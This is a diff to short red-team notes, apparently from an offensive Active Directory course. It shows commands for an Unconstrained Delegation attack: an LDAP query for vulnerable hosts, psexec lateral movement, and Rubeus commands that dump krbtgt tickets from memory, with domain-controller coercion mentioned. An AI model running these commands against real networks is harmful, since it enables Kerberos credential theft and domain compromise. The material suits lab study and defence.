@@ -1,7 +1,7 @@
 
 Search for computers configured for Unconstrained Delegation
 ```powershell
-ldapsearch (&(samAccountType=805306369 (userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samaccountname
+ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samaccountname
 ```
 
 Within SYSTEM level beacon on Unconstrained Delegation host, monitor for incoming TGTs on host
@@ -12,16 +12,18 @@ jump psexec64 lon-ws-1 smb
 
 > Few options here: 
 
-1.  Dump tickets from memory (hopefully a DA is here)
+1.  Perform coercion to make a high level machine (DC) connect
 
 ```powershell
-execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /nowrap
+
 ```
 
-2. Perform coercion to make a high level machine (DC) connect
+2. Dump tickets from memory
 
 ```powershell
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
 
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x6c5b5 /service:krbtgt /nowrap
 ```
 
 
